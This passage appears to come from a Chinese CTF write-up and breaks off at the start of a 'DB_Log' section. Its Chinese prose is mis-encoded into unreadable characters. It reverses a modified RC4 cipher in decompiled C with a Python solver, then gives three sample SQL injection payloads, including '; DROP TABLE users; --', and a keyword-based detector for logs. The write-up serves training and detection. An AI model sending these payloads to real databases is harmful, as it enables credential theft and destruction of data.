class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸»è¦åŠ å¯†å‡½æ•°ä¸º sub_140001070ï¼ŒRC4 åŠ å¯†ï¼Œä½†ä¸æ˜¯æ ‡å‡†çš„ï¼Œè¿˜æœ‰ä½è¿ç®—å¼‚æˆ–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> __fastcall <span class="hljs-title function_">sub_140001070</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">int</span> a2, _BYTE *a3)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// r11d</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> *v7; <span class="hljs-comment">// r8</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// r8d</span><br>  <span class="hljs-type">char</span> *v9; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// r9d</span><br>  <span class="hljs-type">char</span> v11; <span class="hljs-comment">// di</span><br>  <span class="hljs-type">char</span> *v12; <span class="hljs-comment">// rcx</span><br>  <span class="hljs-type">char</span> result; <span class="hljs-comment">// al</span><br>  <span class="hljs-type">int</span> v14; <span class="hljs-comment">// r9d</span><br>  <span class="hljs-type">int</span> v15; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">int</span> v16; <span class="hljs-comment">// esi</span><br>  __int64 v17; <span class="hljs-comment">// rbp</span><br>  _BYTE *v18; <span class="hljs-comment">// rdi</span><br>  __int64 v19; <span class="hljs-comment">// r15</span><br>  <span class="hljs-type">int</span> v20; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">char</span> v21; <span class="hljs-comment">// r8</span><br>  <span class="hljs-type">char</span> *v22; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">char</span> v23[<span class="hljs-number">256</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-118h] BYREF</span><br><br>  v3 = <span class="hljs-number">0</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  v7 = v23;<br>  <span class="hljs-keyword">do</span><br>    *v7++ = v5++;<br>  <span class="hljs-keyword">while</span> ( v5 &lt; <span class="hljs-number">256</span> );<br>  v8 = <span class="hljs-number">0</span>;<br>  v9 = v23;<br>  v10 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    v11 = *v9;<br>    v8 = (<span class="hljs-type">int</span>)(v8 + (<span class="hljs-type">unsigned</span> __int8)*v9 - <span class="hljs-number">7</span> * (v10 / <span class="hljs-number">7u</span>) + v10 + <span class="hljs-number">4919</span>) % <span class="hljs-number">256</span>;<br>    v12 = &amp;v23[v8];<br>    ++v10;<br>    result = *v12;<br>    *v9++ = *v12;<br>    *v12 = v11;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v10 &lt; <span class="hljs-number">256</span> );<br>  v14 = <span class="hljs-number">0</span>;<br>  v15 = <span class="hljs-number">0</span>;<br>  v16 = <span class="hljs-number">0</span>;<br>  v17 = a2;<br>  <span class="hljs-keyword">if</span> ( a2 &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    v18 = a3;<br>    v19 = a1 - (_QWORD)a3;<br>    v16 = a2;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      v14 = (v14 + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>      <span class="hljs-keyword">if</span> ( v14 == <span class="hljs-number">3</span> * (v14 / <span class="hljs-number">3</span>) )<br>        v20 = (<span class="hljs-type">unsigned</span> __int8)v23[<span class="hljs-number">3</span> * v14 % <span class="hljs-number">256</span>] + v15;<br>      <span class="hljs-keyword">else</span><br>        v20 = (<span class="hljs-type">unsigned</span> __int8)v23[v14] + v15;<br>      v15 = v20 % <span class="hljs-number">256</span>;<br>      v21 = v23[v14];<br>      v22 = &amp;v23[v15];<br>      v23[v14] = *v22;<br>      *v22 = v21;<br>      result = v14 * v15 % <span class="hljs-number">16</span>;<br>      *v18 = __ROL1__(result + (v18[v19] ^ v23[(<span class="hljs-type">unsigned</span> __int8)(v21 + v23[v14])]), <span class="hljs-number">3</span>);<br>      ++v18;<br>      --v17;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( v17 );<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( v16 &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      result = *a3 ^ <span class="hljs-number">0x42</span>;<br>      *a3 = result;<br>      <span class="hljs-keyword">if</span> ( v3 )<br>      &#123;<br>        result ^= *(a3 - <span class="hljs-number">1</span>);<br>        *a3 = result;<br>      &#125;<br>      ++v3;<br>      ++a3;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( v3 &lt; v16 );<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ word_14001D658 ä¸­æ‹¿åˆ°å­—ç¬¦</p><p><img src="https://img.dkdun.cn/v1/2025/12/719c290cd24ed534.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x93</span>, <span class="hljs-number">0</span>xF9, <span class="hljs-number">0</span>x8D, <span class="hljs-number">0</span>x92, <span class="hljs-number">0</span>x52, <span class="hljs-number">0</span>x57, <span class="hljs-number">0</span>xD9, <span class="hljs-number">0</span>x05, <span class="hljs-number">0</span>xC6, <span class="hljs-number">0</span>x0A, <span class="hljs-number">0</span>x50, <span class="hljs-number">0</span>xC7, <span class="hljs-number">0</span>xDB, <span class="hljs-number">0</span>x4F, <span class="hljs-number">0</span>xCB, <span class="hljs-number">0</span>xD8, <span class="hljs-number">0</span>x5D, <span class="hljs-number">0</span>xA6, <span class="hljs-number">0</span>xB9, <span class="hljs-number">0</span>x40, <span class="hljs-number">0</span>x95, <span class="hljs-number">0</span>x70, <span class="hljs-number">0</span>xE7, <span class="hljs-number">0</span>x9A, <span class="hljs-number">0</span>x37, <span class="hljs-number">0</span>x72, <span class="hljs-number">0</span>x4D, <span class="hljs-number">0</span>xEF, <span class="hljs-number">0</span>x57<br></code></pre></td></tr></table></figure><p>è„šæœ¬é€†å‘è§£å¯†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span><br><br>ida_chars = [<br>    <span class="hljs-number">0x93</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x0A</span>,<br>    <span class="hljs-number">0x50</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x40</span>,<br>    <span class="hljs-number">0x95</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x57</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rol</span>(<span class="hljs-params">val, r_bits, max_bits=<span class="hljs-number">8</span></span>):<br>    <span class="hljs-keyword">return</span> ((val &lt;&lt; r_bits) &amp; (<span class="hljs-number">2</span>**max_bits - <span class="hljs-number">1</span>)) | (val &gt;&gt; (max_bits - r_bits))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ror</span>(<span class="hljs-params">val, r_bits, max_bits=<span class="hljs-number">8</span></span>):<br>    <span class="hljs-keyword">return</span> ((val &gt;&gt; r_bits) | (val &lt;&lt; (max_bits - r_bits))) &amp; (<span class="hljs-number">2</span>**max_bits - <span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_final_stage</span>(<span class="hljs-params">enc: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]:<br>    <span class="hljs-comment"># é€†è½¬æœ€åçš„å¼‚æˆ–é“¾</span><br>    tmp = enc[:]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(tmp)-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        tmp[i] ^= tmp[i-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(tmp)):<br>        tmp[i] ^= <span class="hljs-number">0x42</span><br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_sbox</span>():<br>    sbox = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    v8 = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        v8 = (v8 + sbox[i] - <span class="hljs-number">7</span> * (i // <span class="hljs-number">7</span>) + i + <span class="hljs-number">4919</span>) % <span class="hljs-number">256</span><br>        sbox[i], sbox[v8] = sbox[v8], sbox[i]<br>    <span class="hljs-keyword">return</span> sbox<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_rc4_variant</span>(<span class="hljs-params">enc_bytes: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]:<br>    sbox = init_sbox()<br>    v14 = <span class="hljs-number">0</span><br>    v15 = <span class="hljs-number">0</span><br>    data_len = <span class="hljs-built_in">len</span>(enc_bytes)<br>    plain = [<span class="hljs-number">0</span>] * data_len<br><br>    <span class="hljs-comment"># é€†å‘PRGA + ä½è¿ç®—é€†</span><br>    <span class="hljs-comment"># é€å­—èŠ‚é€†æ¨æ˜æ–‡ï¼š </span><br>    <span class="hljs-comment"># val = ROL3((v14 * v15 % 16 + (plain[i] ^ keystream))) </span><br>    <span class="hljs-comment"># ç°å·²çŸ¥ val = enc_bytes[i]</span><br>    <span class="hljs-comment"># å…ˆé€†ROL3 -&gt; ror3</span><br>    <span class="hljs-comment"># åˆ™: val&#x27; = (v14 * v15 % 16 + (plain[i] ^ keystream)) &amp; 0xFF = ror3(enc_bytes[i])</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(data_len):<br>        v14 = (v14 + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        <span class="hljs-keyword">if</span> v14 % <span class="hljs-number">3</span> == <span class="hljs-number">0</span>:<br>            v20 = (sbox[(<span class="hljs-number">3</span> * v14) % <span class="hljs-number">256</span>] + v15) % <span class="hljs-number">256</span><br>        <span class="hljs-keyword">else</span>:<br>            v20 = (sbox[v14] + v15) % <span class="hljs-number">256</span><br>        v15 = v20<br>        v21 = sbox[v14]<br>        sbox[v14], sbox[v15] = sbox[v15], sbox[v14]<br>        keystream = sbox[(v21 + sbox[v14]) % <span class="hljs-number">256</span>]<br><br>        val = ror(enc_bytes[i], <span class="hljs-number">3</span>)  <span class="hljs-comment"># é€†å‘å·¦æ—‹3ä½</span><br>        <span class="hljs-comment"># val = (v14 * v15 % 16 + (plain[i] ^ keystream)) &amp; 0xFF</span><br><br>        <span class="hljs-comment"># è®¡ç®— (plain[i] ^ keystream) = val - (v14 * v15 % 16)</span><br>        sub = (v14 * v15) % <span class="hljs-number">16</span><br>        val_sub = (val - sub) &amp; <span class="hljs-number">0xFF</span><br>        plain[i] = val_sub ^ keystream<br><br>    <span class="hljs-keyword">return</span> plain<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    stage1 = reverse_final_stage(ida_chars)<br>    plaintext = decrypt_rc4_variant(stage1)<br><br>    <span class="hljs-comment"># è¾“å‡ºç»“æœä¸º bytesï¼Œå°è¯•æ‰“å°ascii</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted plaintext (ascii):&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">chr</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> plaintext))<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Non-printable characters detected, hex output:&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; &quot;</span>.join(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;c:02x&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> plaintext))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>å¾—åˆ° flag</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">flag&#123;Th1s_1s_<span class="hljs-built_in">A_Fl4w3d</span>_Crypt0&#125;<br></code></pre></td></tr></table></figure><h1 id="æ•°æ®å®‰å…¨"><a href="#æ•°æ®å®‰å…¨" class="headerlink" title="æ•°æ®å®‰å…¨"></a>æ•°æ®å®‰å…¨</h1><h2 id="SQLi-Detection"><a href="#SQLi-Detection" class="headerlink" title="SQLi_Detection"></a>SQLi_Detection</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">æ£€æµ‹ä¸‰ç§æ ¸å¿ƒçš„<span class="hljs-keyword">SQL</span>æ³¨å…¥æ¨¡å¼ï¼š<br><br>æ£€æµ‹è§„åˆ™<br>æƒ…å†µ<span class="hljs-number">1</span>ï¼šå¸ƒå°”æ³¨å…¥<br><br>æ¨¡å¼ï¼š<span class="hljs-string">&#x27; OR æˆ– &#x27;</span> <span class="hljs-keyword">AND</span><br>ç¤ºä¾‹ï¼š<span class="hljs-keyword">admin</span><span class="hljs-string">&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; --</span><br><span class="hljs-string">åŸç†ï¼šé€šè¿‡OR/ANDæ¡ä»¶ç»•è¿‡èº«ä»½éªŒè¯</span><br><span class="hljs-string">æƒ…å†µ2ï¼šè”åˆæŸ¥è¯¢æ³¨å…¥</span><br><span class="hljs-string"></span><br><span class="hljs-string">æ¨¡å¼ï¼š&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span><br>ç¤ºä¾‹ï¼š<span class="hljs-string">&#x27; UNION SELECT username,password FROM users --</span><br><span class="hljs-string">åŸç†ï¼šé€šè¿‡UNIONè”åˆæŸ¥è¯¢è·å–é¢å¤–æ•°æ®</span><br><span class="hljs-string">æƒ…å†µ3ï¼šå †å æŸ¥è¯¢æ³¨å…¥</span><br><span class="hljs-string"></span><br><span class="hljs-string">æ¨¡å¼ï¼š&#x27;</span>; å±é™©è¯­å¥<br>ç¤ºä¾‹ï¼š<span class="hljs-string">&#x27;; DROP TABLE users; --</span><br><span class="hljs-string">åŸç†ï¼šé€šè¿‡åˆ†å·æ‰§è¡Œå¤šä¸ªSQLè¯­å¥</span><br><span class="hljs-string">åˆ¤å®šé€»è¾‘</span><br><span class="hljs-string">æ»¡è¶³ä»¥ä¸Šä»»ä¸€æ¨¡å¼å³åˆ¤å®šä¸ºSQLæ³¨å…¥æ”»å‡»ã€‚</span><br><span class="hljs-string"></span><br><span class="hljs-string">ä»»åŠ¡ï¼šç»Ÿè®¡ logs.txt ä¸­ç–‘ä¼¼ SQL æ³¨å…¥çš„è¡Œæ•°ï¼Œflagæ ¼å¼ï¼šflag&#123;è¡Œæ•°&#125;ã€‚</span><br></code></pre></td></tr></table></figure><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">count_sql_injection_logs</span>(<span class="hljs-params">log_file_path</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    åˆ†ææ—¥å¿—æ–‡ä»¶ï¼Œæ ¹æ®é¢„è®¾çš„ä¸‰ç§æ ¸å¿ƒSQLæ³¨å…¥æ¨¡å¼ç»Ÿè®¡ç–‘ä¼¼æ”»å‡»çš„è¡Œæ•°ã€‚</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Args:</span><br><span class="hljs-string">        log_file_path (str): æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„ã€‚</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Returns:</span><br><span class="hljs-string">        int: ç–‘ä¼¼SQLæ³¨å…¥æ”»å‡»çš„æ—¥å¿—è¡Œæ•°ã€‚</span><br><span class="hljs-string">             å¦‚æœæ–‡ä»¶æœªæ‰¾åˆ°ï¼Œåˆ™è¿”å› -1ã€‚</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    suspicious_lines_count = <span class="hljs-number">0</span><br><br>    <span class="hljs-comment"># æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(log_file_path):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;é”™è¯¯: æ—¥å¿—æ–‡ä»¶ &#x27;<span class="hljs-subst">&#123;log_file_path&#125;</span>&#x27; ä¸å­˜åœ¨ã€‚&quot;</span>)<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(log_file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>                <span class="hljs-comment"># ä¸ºäº†ä¸åŒºåˆ†å¤§å°å†™ï¼Œå°†æ•´è¡Œè½¬æ¢ä¸ºå°å†™è¿›è¡ŒåŒ¹é…</span><br>                processed_line = line.lower()<br><br>                <span class="hljs-comment"># è§„åˆ™1ï¼šæ£€æµ‹å¸ƒå°”æ³¨å…¥ (&#x27; or &#x27; æˆ– &#x27; and &#x27;)</span><br>                <span class="hljs-comment"># ä½¿ç”¨ &#x27; or &#x27; å’Œ &#x27; and &#x27; (å¸¦ç©ºæ ¼) æ¥é¿å…åŒ¹é…åˆ°å•è¯å¦‚ &#x27;error&#x27; æˆ– &#x27;android&#x27;</span><br>                is_boolean_injection = <span class="hljs-string">&quot;&#x27; or &quot;</span> <span class="hljs-keyword">in</span> processed_line <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&#x27; and &quot;</span> <span class="hljs-keyword">in</span> processed_line<br><br>                <span class="hljs-comment"># è§„åˆ™2ï¼šæ£€æµ‹è”åˆæŸ¥è¯¢æ³¨å…¥ (&#x27; union select)</span><br>                is_union_injection = <span class="hljs-string">&quot;&#x27; union select&quot;</span> <span class="hljs-keyword">in</span> processed_line<br><br>                <span class="hljs-comment"># è§„åˆ™3ï¼šæ£€æµ‹å †å æŸ¥è¯¢æ³¨å…¥ (&#x27;;)</span><br>                is_stacked_injection = <span class="hljs-string">&quot;&#x27;;&quot;</span> <span class="hljs-keyword">in</span> processed_line<br><br>                <span class="hljs-comment"># åˆ¤å®šé€»è¾‘ï¼šæ»¡è¶³ä»»ä¸€æ¨¡å¼å³åˆ¤å®šä¸ºSQLæ³¨å…¥æ”»å‡»</span><br>                <span class="hljs-keyword">if</span> is_boolean_injection <span class="hljs-keyword">or</span> is_union_injection <span class="hljs-keyword">or</span> is_stacked_injection:<br>                    suspicious_lines_count += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">return</span> suspicious_lines_count<br><br><br><span class="hljs-comment"># --- ä¸»ç¨‹åº ---</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    log_file = <span class="hljs-string">&#x27;logs.txt&#x27;</span><br><br>    <span class="hljs-comment"># æ‰§è¡Œæ£€æµ‹å¹¶è·å–è¡Œæ•°</span><br>    count = count_sql_injection_logs(log_file)<br><br>    <span class="hljs-comment"># å¦‚æœå‡½æ•°æˆåŠŸæ‰§è¡Œï¼ˆè¿”å›å€¼ä¸ä¸º-1ï¼‰ï¼Œåˆ™æ‰“å°flag</span><br>    <span class="hljs-keyword">if</span> count != -<span class="hljs-number">1</span>:<br>        flag = <span class="hljs-string">f&quot;flag&#123;&#123;<span class="hljs-subst">&#123;count&#125;</span>&#125;&#125;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æ£€æµ‹å®Œæˆã€‚&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;å‘ç°ç–‘ä¼¼ SQL æ³¨å…¥çš„è¡Œæ•°: <span class="hljs-subst">&#123;count&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ç”Ÿæˆçš„ Flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ° flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">451</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="DB-Log"><a href="#DB-Log" class="headerlink" title="DB_Log"></a>DB_Log</h2><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs 